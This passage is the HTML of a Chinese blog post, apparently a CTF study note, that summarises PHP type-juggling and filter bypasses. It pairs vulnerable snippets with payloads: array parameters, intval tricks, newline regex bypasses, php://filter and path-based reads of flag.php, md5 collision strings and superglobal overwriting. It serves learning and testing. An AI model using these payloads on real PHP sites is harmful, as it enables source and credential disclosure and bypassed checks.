@@ -1,0 +1,889 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>PHP特性总结 - 无言の小屋</title>
+
+  
+    <meta name="description" content="PHP特性总结数组绕过正则表达式123456if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;    die(&quot;no no no!&quot;);&#125;else(intval($num))&#123;    echo $flag;&#125;  preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num)  作用：检查 $n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP特性总结">
+<meta property="og:url" content="https://ikunmma.github.io/2025/07/09/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="无言の小屋">
+<meta property="og:description" content="PHP特性总结数组绕过正则表达式123456if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;    die(&quot;no no no!&quot;);&#125;else(intval($num))&#123;    echo $flag;&#125;  preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num)  作用：检查 $n">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-07-09T03:46:32.096Z">
+<meta property="article:modified_time" content="2025-05-18T01:36:28.512Z">
+<meta property="article:author" content="Hackun">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <meta name="keywords" content="漏洞,PHP">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+
+  
+    <link rel="shortcut icon" href="/img/hh.jpg">
+  
+
+  
+
+  
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/aa.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">无言の小屋</div><div class="sub normal cap">在谷底也要开花，在海底也要望月</div><div class="sub hover cap" style="opacity:0"> Designed by hackun</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" target="_blank" rel="noopener" href="https://hackun.fun/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/07/09/MySQL%20handler%E7%9A%84%E7%94%A8%E6%B3%95%E4%B8%8E%E5%BA%94%E7%94%A8/"><span class="title">MySQL</span></a><a class="item title" href="/2025/07/09/Flask%E4%B8%AD%E7%9A%84Jinja2%E7%AE%80%E5%8D%95%E7%94%A8%E6%B3%95/"><span class="title">SSTI漏洞</span></a><a class="item title" href="/2025/07/09/Python%20SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"><span class="title">SSTI漏洞</span></a><a class="item title" href="/2025/07/09/C++%E4%B8%AD%E7%9A%84%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E3%80%81%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/"><span class="title">C++</span></a><a class="item title" href="/2025/07/09/%5Bflask%5DSSTI%201/"><span class="title">“Buuctf [flask]SSTI”</span></a><a class="item title" href="/2025/07/09/%5BSUCTF-2019%5DEasySQL/"><span class="title">“[SUCTF 2019]EasySQL”</span></a><a class="item title" href="/2025/07/09/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><span class="title">“[强网杯 2019]随便注”</span></a><a class="item title" href="/2025/07/09/C++%E4%B8%AD%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E8%BF%90%E7%AE%97%E7%AC%A6/"><span class="title">C++</span></a><a class="item title" href="/2025/07/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><span class="title">文件上传漏洞</span></a><a class="item title" href="/2025/07/09/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><span class="title">PHP文件包含漏洞</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/PHP/">PHP</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/PHP/%E6%BC%8F%E6%B4%9E/">漏洞</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-07-09T03:46:32.096Z">2025-07-09</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-05-18T01:36:28.512Z">2025-05-18</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>PHP特性总结</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="PHP特性总结"><a href="#PHP特性总结" class="headerlink" title="PHP特性总结"></a>PHP特性总结</h1><h2 id="数组绕过正则表达式"><a href="#数组绕过正则表达式" class="headerlink" title="数组绕过正则表达式"></a>数组绕过正则表达式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;<br>    die(&quot;no no no!&quot;);<br>&#125;<br>else(intval($num))&#123;<br>    echo $flag;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong><code>preg_match(&quot;/[0-9]/&quot;, $num)</code></strong></p>
+<ul>
+<li>作用：检查 <code>$num</code> 是否包含 <strong>数字 0-9</strong></li>
+<li><strong>如果包含</strong>，就 <code>die(&quot;no no no!&quot;);</code> 终止程序</li>
+<li><strong>如果不包含</strong>，执行 <code>elseif (intval($num))</code></li>
+</ul>
+<p><strong><code>intval($num)</code></strong></p>
+<ul>
+<li>作用：尝试将 <code>$num</code> <strong>转换为整数</strong></li>
+<li><strong>如果转换结果为真</strong>（非 0），就输出 <code>$flag</code></li>
+<li><strong>如果转换结果为 0</strong>，则不输出 <code>$flag</code></li>
+</ul>
+<p><code>preg_match</code>第二个参数要求是字符串，如果传入数组则不会进入if语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload: num[]=1<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p><code>num[]=1</code>绕过原理分析</p>
+<ol>
+<li><strong>绕过 <code>preg_match()</code></strong></li>
+</ol>
+<p>当你传递 <code>num[]=1</code> 作为参数时，<code>$num</code> 变成了一个包含单个元素的数组：<code>array(1)</code>。</p>
+<p><code>preg_match(&quot;/[0-9]/&quot;, $num)</code> 试图在数组中查找数字，然而 <strong><code>preg_match()</code> 只接受字符串类型作为参数</strong>，因此它会触发一个警告并返回 <code>false</code>。由于警告不会阻止代码继续执行，<code>preg_match()</code> 不会成功匹配数字，导致代码继续进入 <code>elseif</code> 分支。</p>
+<ol start="2">
+<li><strong>触发 <code>intval($num)</code></strong></li>
+</ol>
+<p>对于 <code>intval($num)</code>，如果 <code>$num</code> 是一个 <strong>非空数组</strong>（比如 <code>array(1)</code>），PHP 会将其转化为 <strong><code>1</code></strong>，因此条件 <code>intval($num)</code> 会成立，进入 <code>elseif</code> 分支并触发 <code>echo $flag</code>。</p>
+</blockquote>
+<h2 id="intval函数的使用"><a href="#intval函数的使用" class="headerlink" title="intval函数的使用"></a>intval函数的使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if($num===&quot;4476&quot;)&#123;<br>    die(&quot;no no no!&quot;);<br>&#125;<br>if(intval($num,0)===4476)&#123;<br>    echo $flag;<br>&#125;<br>else&#123;<br>    echo intval($num,0);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong><code>intval( mixed $value, int $base = 10) : int</code></strong></p>
+<ul>
+<li>当 <code>base</code> 参数的值为 <code>0</code> 时，<code>intval()</code> 会根据输入字符串的 <strong>前缀</strong> 自动推断进制</li>
+<li><strong>如果字符串以 <code>0x</code> 或 <code>0X</code> 开头</strong>，则该字符串会被视为 <strong>十六进制</strong> 数字</li>
+<li><strong>如果字符串以 <code>0</code> 开头</strong>，则该字符串会被视为 <strong>八进制</strong> 数字</li>
+<li><strong>其他情况</strong>，则会将该字符串视为 <strong>十进制</strong> 数字</li>
+</ul>
+<p><strong>用科学计数法绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">intval(&#x27;4476.0&#x27;)===4476 小数点<br>intval(&#x27;+4476.0&#x27;)===4476 正负号<br>intval(&#x27;4476e0&#x27;)===4476 科学计数法<br>intval(&#x27;0x117c&#x27;)===4476 16进制<br>intval(&#x27;010574&#x27;)===4476 8进制<br>intval(&#x27; 010574&#x27;)===4476 8进制+空格<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload: num=4476.0<br></code></pre></td></tr></table></figure>
+
+<h2 id="正则表达式修饰符"><a href="#正则表达式修饰符" class="headerlink" title="正则表达式修饰符"></a>正则表达式修饰符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;<br>    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;<br>        echo &#x27;hacker&#x27;;<br>    &#125;<br>    else&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br>else&#123;<br>    echo &#x27;nonononono&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong><code>i</code>（不区分大小写）</strong>：意味着 <code>php</code>、<code>PHP</code>、<code>PhP</code> 都能匹配。</p>
+<p><strong><code>m</code>（多行模式）</strong>：</p>
+<ul>
+<li><code>^</code> 代表 <strong>每一行</strong> 的开头，而不是整个字符串的开头。</li>
+<li><code>$</code> 代表 <strong>每一行</strong> 的结尾，而不是整个字符串的结尾。</li>
+</ul>
+<p>如果 <code>$a</code> 满足第一个条件 <code>/^php$/im</code>（不区分大小写且支持多行匹配），就进入内部的判断。</p>
+<ul>
+<li>如果 <code>$a</code> 仅等于 <code>&quot;php&quot;</code>（不区分大小写），则输出 <code>&quot;hacker&quot;</code>。</li>
+<li>如果 <code>$a</code> 满足第一个正则表达式，但不完全等于 <code>&quot;php&quot;</code>，则输出 <code>$flag</code>。</li>
+</ul>
+<p>如果 <code>$a</code> 没有匹配第一个条件 <code>/^php$/im</code>，则输出 <code>&quot;nonononono&quot;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload: %0aphp   或   php%0aphp<br></code></pre></td></tr></table></figure>
+
+<h2 id="highlight-file路径"><a href="#highlight-file路径" class="headerlink" title="highlight_file路径"></a>highlight_file路径</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;<br>    die(&quot;no no no&quot;);<br>&#125;<br>else&#123;<br>    highlight_file($_GET[&#x27;u&#x27;]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>if语句只比对字符串，highlight_file可以写路径，故payload有多种解法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?u=php://filter/read=convert.base64-encode/resource=flag.php     php伪协议<br>?u=/var/www/html/flag.php                                        绝对路径<br>?u=./flag.php                                                    相对路径<br></code></pre></td></tr></table></figure>
+
+<h2 id="md5比较缺陷"><a href="#md5比较缺陷" class="headerlink" title="md5比较缺陷"></a>md5比较缺陷</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) &#123;<br>    if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;<br>        echo $flag;<br>    &#125; else &#123;<br>        print &#x27;Wrong.&#x27;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要找到两个 <strong>不相等的值</strong>，但它们的 <code>md5()</code> 计算结果相同，即 <strong>MD5 碰撞</strong></p>
+<h3 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h3><h4 id="不同数据强相等（-）"><a href="#不同数据强相等（-）" class="headerlink" title="不同数据强相等（&#x3D;&#x3D;&#x3D;）"></a>不同数据强相等（&#x3D;&#x3D;&#x3D;）</h4><p><strong>未使用强制类型转化</strong></p>
+<p>MD5无法处理数组，如果传入数组则返回NULL，两个NULL是强相等的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload: a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure>
+
+<h4 id="不同数据弱相等（-）"><a href="#不同数据弱相等（-）" class="headerlink" title="不同数据弱相等（&#x3D;&#x3D;）"></a>不同数据弱相等（&#x3D;&#x3D;）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload: a=QNKCDZO&amp;b=240610708<br></code></pre></td></tr></table></figure>
+
+<h4 id="科学记数法绕过"><a href="#科学记数法绕过" class="headerlink" title="科学记数法绕过"></a>科学记数法绕过</h4><p><strong>0e 开头的字符串</strong>会被 PHP 识别为 <strong>科学记数法</strong>，并转换为数字 <code>0</code>，只需找两个md5后都为0e开头且0e</p>
+<p>后面均为数字的值即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload：a=0e215962017&amp;b=0e0<br></code></pre></td></tr></table></figure>
+
+<h3 id="md5强碰撞"><a href="#md5强碰撞" class="headerlink" title="md5强碰撞"></a>md5强碰撞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$a = (string)$a;<br>$b = (string)$b;<br>if( ($a !== $b) &amp;&amp; (md5($a) === md5($b)) ) &#123;<br>    echo $flag;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的条件要求 <code>$a</code> 和 <code>$b</code> 必须 <strong>不相等</strong>，但它们的 <strong>MD5 哈希值相同</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br>b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br></code></pre></td></tr></table></figure>
+
+<h2 id="sha1比较缺陷"><a href="#sha1比较缺陷" class="headerlink" title="sha1比较缺陷"></a>sha1比较缺陷</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if($a==$b)&#123;<br>    if(sha1($a)==sha1($b))&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>sha1无法处理数组，如上可使用<code>a[]=1&amp;b[]=1</code>数组绕过</p>
+<p>如果强制类型转换，则不接受数组，找真正的编码后相同的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m<br></code></pre></td></tr></table></figure>
+
+<h2 id="三目运算符的理解-变量覆盖"><a href="#三目运算符的理解-变量覆盖" class="headerlink" title="三目运算符的理解+变量覆盖"></a>三目运算符的理解+变量覆盖</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;<br>$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;<br>$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;<br>highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$_GET ? $_GET = &amp;$_POST : &#x27;flag&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>果 <code>$_GET</code> 数组不为空，则将 <code>$_GET</code> 的引用赋值给 <code>$_POST</code>即<code>$_GET</code> 和 <code>$_POST</code> 会指向相同的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$_GET[&#x27;flag&#x27;] == &#x27;flag&#x27; ? $_GET = &amp;$_COOKIE : &#x27;flag&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>如果 <code>$_GET[&#39;flag&#39;]</code> 的值为 <code>&#39;flag&#39;</code>，则将 <code>$_GET</code> 数组的引用赋值给 <code>$_COOKIE</code>即<code>$_GET</code> 和 <code>$_COOKIE</code> 将指向相同的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$_GET[&#x27;flag&#x27;] == &#x27;flag&#x27; ? $_GET = &amp;$_SERVER : &#x27;flag&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>如果 <code>$_GET[&#39;flag&#39;]</code> 的值为 <code>&#39;flag&#39;</code>，则将 <code>$_GET</code> 数组的引用赋值给 <code>$_SERVER</code>。这使得 <code>$_GET</code> 和 <code>$_SERVER</code> 指向相同的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;] == &#x27;flag&#x27; ? $flag : __FILE__);<br></code></pre></td></tr></table></figure>
+
+<p>该行会高亮显示文件内容，条件是 <code>$_GET[&#39;HTTP_FLAG&#39;]</code> 等于 <code>&#39;flag&#39;</code>。如果条件为真，它会显示 <code>$flag</code> 变量的内容；否则，它会显示当前脚本文件的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload:<br>GET 请求: 1=1<br>POST 请求: HTTP_FLAG=flag<br></code></pre></td></tr></table></figure>
+
